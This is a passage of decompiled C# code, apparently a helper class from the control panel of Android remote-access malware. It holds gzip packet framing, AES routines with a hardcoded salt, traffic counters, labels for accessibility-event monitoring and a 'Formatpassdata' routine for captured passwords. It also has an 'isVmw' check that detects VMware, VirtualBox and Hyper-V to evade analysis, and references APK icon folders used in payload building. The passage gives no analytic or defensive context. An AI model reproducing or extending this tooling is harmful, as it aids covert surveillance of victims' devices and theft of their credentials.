				memoryStream.Dispose();
				memoryStream = new MemoryStream();
				long num2 = (long)s.GetValue(1);
				memoryStream.Write(b, (int)num, (int)num2);
				array2 = memoryStream.ToArray();
				array[1] = Codes.DEgzip(ref array2);
				memoryStream.Dispose();
				return array;
			}
		}

		// Token: 0x060003CC RID: 972 RVA: 0x00003171 File Offset: 0x00001371
		public static object Formatpassdata(string msg)
		{
			if (!msg.Contains("~"))
			{
				return msg;
			}
			return msg.Replace("~", "\r\n").Replace("[EOF]", "--------------");
		}

		// Token: 0x060003CD RID: 973 RVA: 0x00052CF8 File Offset: 0x00050EF8
		public static string ExtractDomain(string input)
		{
			string text = "Blank";
			if (input.Contains("/"))
			{
				Uri uri;
				if (!Uri.TryCreate(input, UriKind.Absolute, out uri))
				{
					return input.Substring(0, input.IndexOf("/")).Trim();
				}
				text = uri.Host;
			}
			return text;
		}

		// Token: 0x060003CE RID: 974 RVA: 0x00052D44 File Offset: 0x00050F44
		private static int FindIndex(byte[] source, byte[] pattern)
		{
			checked
			{
				int num = source.Length - pattern.Length;
				for (int i = 0; i <= num; i++)
				{
					bool flag = true;
					int num2 = pattern.Length - 1;
					for (int j = 0; j <= num2; j++)
					{
						if (source[i + j] != pattern[j])
						{
							flag = false;
							break;
						}
					}
					if (flag)
					{
						return i;
					}
				}
				return -1;
			}
		}

		// Token: 0x060003CF RID: 975 RVA: 0x000031A1 File Offset: 0x000013A1
		public static string BSDE(string Str)
		{
			return global::System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(Str));
		}

		// Token: 0x060003D0 RID: 976 RVA: 0x00052D94 File Offset: 0x00050F94
		public static Point FixSize(Form lc0, Form lc1)
		{
			checked
			{
				int num = lc0.Location.X + (int)Math.Round((double)lc0.Width / 2.0) - (int)Math.Round((double)lc1.Width / 2.0);
				int num2 = lc0.Location.Y + (int)Math.Round((double)lc0.Height / 2.0) - (int)Math.Round((double)lc1.Height / 2.0);
				if (num < 0)
				{
					num = 0;
				}
				if (num2 < 0)
				{
					num2 = 0;
				}
				if (num > Screen.PrimaryScreen.WorkingArea.Size.Width - lc1.Size.Width)
				{
					num = Screen.PrimaryScreen.WorkingArea.Size.Width - lc1.Size.Width;
				}
				if (num2 > Screen.PrimaryScreen.WorkingArea.Size.Height - lc1.Size.Height)
				{
					num2 = Screen.PrimaryScreen.WorkingArea.Size.Height - lc1.Size.Height;
				}
				return new Point(num, num2);
			}
		}

		// Token: 0x060003D1 RID: 977 RVA: 0x00052EE8 File Offset: 0x000510E8
		public static Array BytesConverter(long bytes)
		{
			long num = 1024L;
			long num2 = 1048576L;
			long num3 = 1073741824L;
			long num4 = 1099511627776L;
			string text = "0 Bytes";
			if (bytes < 1024L)
			{
				text = Conversions.ToString(bytes) + " Bytes";
			}
			else if (bytes > num4)
			{
				text = ((double)bytes / (double)num / (double)num / (double)num / (double)num).ToString("0.00") + " TB";
			}
			else if (bytes > num3)
			{
				text = ((double)bytes / (double)num / (double)num / (double)num).ToString("0.00") + " GB";
			}
			else if (bytes > num2)
			{
				text = ((double)bytes / (double)num / (double)num).ToString("0.00") + " MB";
			}
			else if (bytes >= num)
			{
				text = ((double)bytes / (double)num).ToString("0.00") + " KB";
			}
			return new string[] { text.ToString() };
		}

		// Token: 0x060003D2 RID: 978 RVA: 0x00052FF0 File Offset: 0x000511F0
		public static Array UploadDownload(long ParametersLong0, long ParametersLong1)
		{
			checked
			{
				Array array;
				try
				{
					if (Codes._0024STATIC_0024UploadDownload_0024021281A5AA_0024LastUpload_0024Init == null)
					{
						Interlocked.CompareExchange<StaticLocalInitFlag>(ref Codes._0024STATIC_0024UploadDownload_0024021281A5AA_0024LastUpload_0024Init, new StaticLocalInitFlag(), null);
					}
					bool flag = false;
					try
					{
						Monitor.Enter(Codes._0024STATIC_0024UploadDownload_0024021281A5AA_0024LastUpload_0024Init, ref flag);
						if (Codes._0024STATIC_0024UploadDownload_0024021281A5AA_0024LastUpload_0024Init.State == 0)
						{
							Codes._0024STATIC_0024UploadDownload_0024021281A5AA_0024LastUpload_0024Init.State = 2;
							Codes._0024STATIC_0024UploadDownload_0024021281A5AA_0024LastUpload = ParametersLong0;
						}
						else if (Codes._0024STATIC_0024UploadDownload_0024021281A5AA_0024LastUpload_0024Init.State == 2)
						{
							throw new IncompleteInitialization();
						}
					}
					finally
					{
						Codes._0024STATIC_0024UploadDownload_0024021281A5AA_0024LastUpload_0024Init.State = 1;
						if (flag)
						{
							Monitor.Exit(Codes._0024STATIC_0024UploadDownload_0024021281A5AA_0024LastUpload_0024Init);
						}
					}
					if (Codes._0024STATIC_0024UploadDownload_0024021281A5AA_0024LastDownload_0024Init == null)
					{
						Interlocked.CompareExchange<StaticLocalInitFlag>(ref Codes._0024STATIC_0024UploadDownload_0024021281A5AA_0024LastDownload_0024Init, new StaticLocalInitFlag(), null);
					}
					bool flag2 = false;
					try
					{
						Monitor.Enter(Codes._0024STATIC_0024UploadDownload_0024021281A5AA_0024LastDownload_0024Init, ref flag2);
						if (Codes._0024STATIC_0024UploadDownload_0024021281A5AA_0024LastDownload_0024Init.State == 0)
						{
							Codes._0024STATIC_0024UploadDownload_0024021281A5AA_0024LastDownload_0024Init.State = 2;
							Codes._0024STATIC_0024UploadDownload_0024021281A5AA_0024LastDownload = ParametersLong1;
						}
						else if (Codes._0024STATIC_0024UploadDownload_0024021281A5AA_0024LastDownload_0024Init.State == 2)
						{
							throw new IncompleteInitialization();
						}
					}
					finally
					{
						Codes._0024STATIC_0024UploadDownload_0024021281A5AA_0024LastDownload_0024Init.State = 1;
						if (flag2)
						{
							Monitor.Exit(Codes._0024STATIC_0024UploadDownload_0024021281A5AA_0024LastDownload_0024Init);
						}
					}
					long num = ParametersLong0 - Codes._0024STATIC_0024UploadDownload_0024021281A5AA_0024LastUpload;
					long num2 = ParametersLong1 - Codes._0024STATIC_0024UploadDownload_0024021281A5AA_0024LastDownload;
					Codes._0024STATIC_0024UploadDownload_0024021281A5AA_0024LastUpload = ParametersLong0;
					Codes._0024STATIC_0024UploadDownload_0024021281A5AA_0024LastDownload = ParametersLong1;
					array = new object[]
					{
						Codes.BytesConverter((num2 < 0L) ? 0L : num2).GetValue(0),
						Codes.BytesConverter((num < 0L) ? 0L : num).GetValue(0)
					};
				}
				catch (Exception)
				{
					array = new string[] { "n/a", "n/a" };
				}
				return array;
			}
		}

		// Token: 0x060003D3 RID: 979 RVA: 0x000531A4 File Offset: 0x000513A4
		public static byte[] DE(byte[] by, string k)
		{
			MemoryStream memoryStream = new MemoryStream();
			checked
			{
				using (MemoryStream memoryStream2 = new MemoryStream(by))
				{
					RijndaelManaged rijndaelManaged = Codes.Rijndle(k);
					using (CryptoStream cryptoStream = new CryptoStream(memoryStream2, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Read))
					{
						byte[] array = new byte[(int)(memoryStream2.Length - 1L) + 1];
						int num = cryptoStream.Read(array, 0, (int)memoryStream2.Length);
						memoryStream.Write(array, 0, num);
					}
				}
				return memoryStream.ToArray();
			}
		}

		// Token: 0x060003D4 RID: 980 RVA: 0x0005323C File Offset: 0x0005143C
		private static RijndaelManaged Rijndle(string secretKey)
		{
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(secretKey, global::System.Text.Encoding.Unicode.GetBytes("xy7h8842n61q50xf2x"));
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			checked
			{
				rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes((int)Math.Round((double)rijndaelManaged.BlockSize / 8.0));
				rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes((int)Math.Round((double)rijndaelManaged.KeySize / 8.0));
				rijndaelManaged.Padding = PaddingMode.PKCS7;
				return rijndaelManaged;
			}
		}

		// Token: 0x060003D5 RID: 981 RVA: 0x000532C0 File Offset: 0x000514C0
		public static byte[] FormatPacket(string Strings, byte[] bByte)
		{
			MemoryStream memoryStream = new MemoryStream();
			byte[] array = Codes.CGzip(bByte);
			byte[] array2 = Codes.CGzip(Codes.Encoding().GetBytes(Strings));
			byte[] bytes = Codes.Encoding().GetBytes(Conversions.ToString(array2.Length));
			byte[] bytes2 = Codes.Encoding().GetBytes("\0");
			byte[] bytes3 = Codes.Encoding().GetBytes(Conversions.ToString(array.Length));
			memoryStream.Write(bytes, 0, bytes.Length);
			memoryStream.Write(bytes2, 0, bytes2.Length);
			memoryStream.Write(bytes3, 0, bytes3.Length);
			memoryStream.Write(bytes2, 0, bytes2.Length);
			memoryStream.Write(array2, 0, array2.Length);
			memoryStream.Write(array, 0, array.Length);
			byte[] array3 = memoryStream.ToArray();
			memoryStream.Dispose();
			return array3;
		}

		// Token: 0x060003D6 RID: 982 RVA: 0x0005337C File Offset: 0x0005157C
		public static string[] GetStatistics(string data)
		{
			string text = "time=";
			string text2 = "packet loss";
			try
			{
				string text3 = data.ToLower();
				if (text3.Contains(text))
				{
					object objectValue = RuntimeHelpers.GetObjectValue(text3.ToLower().Split(new string[] { text }, StringSplitOptions.None).GetValue(1));
					object objectValue2 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(NewLateBinding.LateGet(objectValue, null, "Split", new object[]
					{
						new string[] { "ms" },
						StringSplitOptions.None
					}, null, null, null), null, "GetValue", new object[] { 0 }, null, null, null));
					text = Conversions.ToString(objectValue2).Trim();
				}
				else
				{
					text = "0";
				}
				if (text3.Contains(text2))
				{
					object objectValue3 = RuntimeHelpers.GetObjectValue(text3.Split(new string[] { text2 }, StringSplitOptions.None).GetValue(0));
					object[] array = (object[])NewLateBinding.LateGet(objectValue3, null, "Split", new object[]
					{
						new string[] { "," },
						StringSplitOptions.None
					}, null, null, null);
					text2 = Conversions.ToString(array.GetValue(checked(array.Length - 1)));
				}
			}
			catch (Exception)
			{
				return new string[] { "", "" };
			}
			if (Operators.CompareString(text2, "packet loss", false) != 0)
			{
				return new string[]
				{
					text.Trim(),
					text2.Trim()
				};
			}
			return new string[] { "", "" };
		}

		// Token: 0x060003D7 RID: 983 RVA: 0x0005351C File Offset: 0x0005171C
		public static string GetIPAddress()
		{
			try
			{
				string hostName = Dns.GetHostName();
				IPAddress[] addressList = Dns.GetHostEntry(hostName).AddressList;
				IPAddress[] array = addressList;
				foreach (IPAddress ipaddress in array)
				{
					if (ipaddress.ToString().StartsWith("192.168.1."))
					{
						return ipaddress.ToString();
					}
				}
			}
			catch (Exception)
			{
			}
			return "127.0.0.1";
		}

		// Token: 0x060003D8 RID: 984 RVA: 0x00053594 File Offset: 0x00051794
		public static int RateConverter(int Value, int Totalsize)
		{
			checked
			{
				int num;
				try
				{
					num = ((Totalsize != 0) ? ((int)Math.Round(unchecked((double)Value / (double)Totalsize * 100.0))) : 0);
				}
				catch (Exception)
				{
					num = 0;
				}
				return num;
			}
		}

		// Token: 0x060003D9 RID: 985 RVA: 0x000535D8 File Offset: 0x000517D8
		private static byte[] GenerateKey(string key)
		{
			byte[] bytes = global::System.Text.Encoding.UTF8.GetBytes(key);
			SHA256Managed sha256Managed = new SHA256Managed();
			return sha256Managed.ComputeHash(bytes);
		}

		// Token: 0x060003DA RID: 986 RVA: 0x00053600 File Offset: 0x00051800
		public static string AccessibilityEvent(int v)
		{
			string text;
			switch (v)
			{
			case 0:
				text = "CLICKED";
				break;
			case 1:
				text = "FOCUSED";
				break;
			case 2:
				text = "LONG CLICKED";
				break;
			case 3:
				text = "TEXT";
				break;
			case 4:
				text = "NOTIFICATION";
				break;
			case 5:
				text = "WINDOW CHANGED";
				break;
			default:
				text = "n/a";
				break;
			}
			return text;
		}

		// Token: 0x060003DB RID: 987
		[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern Codes.EXECUTION_STATE SetThreadExecutionState(Codes.EXECUTION_STATE esflags);

		// Token: 0x060003DC RID: 988 RVA: 0x000031B3 File Offset: 0x000013B3
		private static Codes.EXECUTION_STATE Power()
		{
			return Codes.SetThreadExecutionState((Codes.EXECUTION_STATE)(-2147483645));
		}

		// Token: 0x060003DD RID: 989 RVA: 0x000031BF File Offset: 0x000013BF
		public static void AcquirePower()
		{
			Codes.Power();
		}

		// Token: 0x060003DE RID: 990 RVA: 0x00053664 File Offset: 0x00051864
		public static string AES_Encrypt(string input, string pass)
		{
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			new MD5CryptoServiceProvider();
			ASCIIEncoding asciiencoding = new ASCIIEncoding();
			byte[] bytes = asciiencoding.GetBytes(pass);
			try
			{
				rijndaelManaged.Key = bytes;
				rijndaelManaged.Mode = CipherMode.ECB;
				ICryptoTransform cryptoTransform = rijndaelManaged.CreateEncryptor();
				byte[] bytes2 = global::System.Text.Encoding.ASCII.GetBytes(input);
				return Convert.ToBase64String(cryptoTransform.TransformFinalBlock(bytes2, 0, bytes2.Length));
			}
			catch (Exception)
			{
			}
			return "";
		}

		// Token: 0x060003DF RID: 991 RVA: 0x000536E0 File Offset: 0x000518E0
		public static string AES_Decrypt(string text, string password)
		{
			string text2;
			try
			{
				RijndaelManaged rijndaelManaged = new RijndaelManaged();
				MD5CryptoServiceProvider md5CryptoServiceProvider = new MD5CryptoServiceProvider();
				byte[] array = new byte[32];
				byte[] array2 = md5CryptoServiceProvider.ComputeHash(global::System.Text.Encoding.ASCII.GetBytes(password));
				Array.Copy(array2, 0, array, 0, 16);
				Array.Copy(array2, 0, array, 15, 16);
				rijndaelManaged.Key = array;
				rijndaelManaged.Mode = CipherMode.ECB;
				ICryptoTransform cryptoTransform = rijndaelManaged.CreateDecryptor();
				byte[] array3 = Convert.FromBase64String(text);
				text2 = global::System.Text.Encoding.ASCII.GetString(cryptoTransform.TransformFinalBlock(array3, 0, array3.Length));
			}
			catch (Exception)
			{
				text2 = "";
			}
			return text2;
		}

		// Token: 0x060003E0 RID: 992 RVA: 0x00053780 File Offset: 0x00051980
		public static string Encrypt(string text, string password)
		{
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			MD5CryptoServiceProvider md5CryptoServiceProvider = new MD5CryptoServiceProvider();
			byte[] array = new byte[32];
			byte[] array2 = md5CryptoServiceProvider.ComputeHash(global::System.Text.Encoding.ASCII.GetBytes(password));
			Array.Copy(array2, 0, array, 0, 16);
			Array.Copy(array2, 0, array, 15, 16);
			rijndaelManaged.Key = array;
			rijndaelManaged.Mode = CipherMode.ECB;
			ICryptoTransform cryptoTransform = rijndaelManaged.CreateEncryptor();
			byte[] bytes = global::System.Text.Encoding.ASCII.GetBytes(text);
			return Convert.ToBase64String(cryptoTransform.TransformFinalBlock(bytes, 0, bytes.Length));
		}

		// Token: 0x060003E1 RID: 993 RVA: 0x00053800 File Offset: 0x00051A00
		public static string AesDecrypt(string input, string pass)
		{
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			new MD5CryptoServiceProvider();
			ASCIIEncoding asciiencoding = new ASCIIEncoding();
			byte[] bytes = asciiencoding.GetBytes(pass);
			try
			{
				rijndaelManaged.Key = bytes;
				rijndaelManaged.Mode = CipherMode.ECB;
				ICryptoTransform cryptoTransform = rijndaelManaged.CreateDecryptor();
				byte[] array = Convert.FromBase64String(input);
				return global::System.Text.Encoding.ASCII.GetString(cryptoTransform.TransformFinalBlock(array, 0, array.Length));
			}
			catch (Exception)
			{
			}
			return "";
		}

		// Token: 0x060003E2 RID: 994 RVA: 0x0005387C File Offset: 0x00051A7C
		public static bool isVmw()
		{
			using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("Select * from Win32_ComputerSystem"))
			{
				using (ManagementObjectCollection managementObjectCollection = managementObjectSearcher.Get())
				{
					foreach (ManagementBaseObject managementBaseObject in managementObjectCollection)
					{
						string text = managementBaseObject["Manufacturer"].ToString().ToLower();
						if ((Operators.CompareString(text, "microsoft corporation", false) == 0 && managementBaseObject["Model"].ToString().ToUpperInvariant().Contains("VIRTUAL")) || text.Contains("vmware") || Operators.CompareString(managementBaseObject["Model"].ToString(), "VirtualBox", false) == 0)
						{
							return true;
						}
					}
				}
			}
			return false;
		}

		// Token: 0x04000320 RID: 800
		public const int WM_NCLBUTTONDOWN = 161;

		// Token: 0x04000321 RID: 801
		public const int HT_CAPTION = 2;

		// Token: 0x04000322 RID: 802
		private static WebClient webc = new WebClient();

		// Token: 0x04000323 RID: 803
		private static ImageAttributes imageAttributes = new ImageAttributes();

		// Token: 0x04000324 RID: 804
		private const uint WDA_NONE = 0U;

		// Token: 0x04000325 RID: 805
		public const uint WDA_MONITOR = 1U;

		// Token: 0x04000326 RID: 806
		private const uint WDA_EXCLUDEFROMCAPTURE = 17U;

		// Token: 0x04000327 RID: 807
		public static string TempPathCache = Path.Combine(Path.GetTempPath(), "AET", "Cache");

		// Token: 0x04000328 RID: 808
		public static string[] pngs = new string[] { "mipmap-hdpi-v4", "drawable-hdpi-v4", "mipmap-hdpi" };

		// Token: 0x04000329 RID: 809
		private static Random rshit;

		// Token: 0x0400032A RID: 810
		private static WebBrowser wb = new WebBrowser();

		// Token: 0x0400032B RID: 811
		private static long _0024STATIC_0024UploadDownload_0024021281A5AA_0024LastUpload;

		// Token: 0x0400032C RID: 812
		private static StaticLocalInitFlag _0024STATIC_0024UploadDownload_0024021281A5AA_0024LastUpload_0024Init;

		// Token: 0x0400032D RID: 813
		private static long _0024STATIC_0024UploadDownload_0024021281A5AA_0024LastDownload;

		// Token: 0x0400032E RID: 814
		private static StaticLocalInitFlag _0024STATIC_0024UploadDownload_0024021281A5AA_0024LastDownload_0024Init;

		// Token: 0x02000033 RID: 51
		private enum EXECUTION_STATE
		{
			// Token: 0x04000330 RID: 816
			ES_SYSTEM_REQUIRED = 1,
			// Token: 0x04000331 RID: 817
			ES_DISPLAY_REQUIRED,
			// Token: 0x04000332 RID: 818
			ES_CONTINUOUS = -2147483648
		}

		// Token: 0x02000034 RID: 52
		[CompilerGenerated]
		internal sealed class _Closure_0024__26_002D0
		{
			// Token: 0x060003E5 RID: 997 RVA: 0x000031C7 File Offset: 0x000013C7
			public _Closure_0024__26_002D0(Codes._Closure_0024__26_002D0 arg0)
			{
				if (arg0 != null)
				{
					this._0024VB_0024Local_random = arg0._0024VB_0024Local_random;
				}
			}

			// Token: 0x060003E6 RID: 998 RVA: 0x000031DE File Offset: 0x000013DE
			internal char _Lambda_0024__0(string s)
			{
				return s[this._0024VB_0024Local_random.Next(s.Length)];
			}

			// Token: 0x060003E7 RID: 999 RVA: 0x000031DE File Offset: 0x000013DE
			internal char _Lambda_0024__1(string s)
			{
				return s[this._0024VB_0024Local_random.Next(s.Length)];
			}

			// Token: 0x04000333 RID: 819
			public Random _0024VB_0024Local_random;
		}
	}
}
